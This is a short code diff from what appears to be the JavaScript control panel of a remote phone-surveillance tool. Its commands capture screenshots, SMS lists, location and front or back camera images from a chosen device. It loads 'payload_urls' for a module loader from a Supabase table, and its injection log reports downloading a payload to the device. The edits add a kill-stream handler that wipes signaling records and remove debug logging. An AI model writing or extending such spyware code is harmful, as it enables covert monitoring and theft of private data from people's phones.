@@ -164,6 +164,13 @@ const UI = {
                         const dataCmds = [CMD.SCREENSHOT, CMD.SMS_LIST, CMD.LOCATION, CMD.CAMERA_FRONT, CMD.CAMERA_BACK];
                         const isDataCmd = dataCmds.includes(value);
 
+                        // Special handling for KILL_STREAM to ensure local state and signaling are also wiped
+                        if (value === CMD.KILL_STREAM) {
+                            await StreamManager.stop("killall", false, true);
+                            // Also clear signaling table manually as a fail-safe
+                            await supabaseClient.from("signaling").delete().eq("device_id", state.data.selectedDeviceId);
+                        }
+
                         const successCmd = await DeviceService.send(value, { showSuccess: true });
                         if (state.ui.modal?.type === "take_photo_options") closeModal();
 
@@ -275,8 +282,6 @@ const UI = {
                 const { data: settings } = await supabaseClient.from("app_settings").select("value").eq("key", "payload_urls").single();
                 showLoader(false);
 
-                console.log("Settings raw:", settings);
-
                 const pUrl = settings?.value?.module_loader;
                 const pClass = settings?.value?.module_class;
 
@@ -329,7 +334,6 @@ const UI = {
 
         await new Promise(r => setTimeout(r, 600));
         this.updateInjectionLog("Downloading payload from server...");
-        this.updateInjectionLog("CLASS: " + className);
 
         await new Promise(r => setTimeout(r, 700));
         this.updateInjectionLog("Checking device compatibility...");
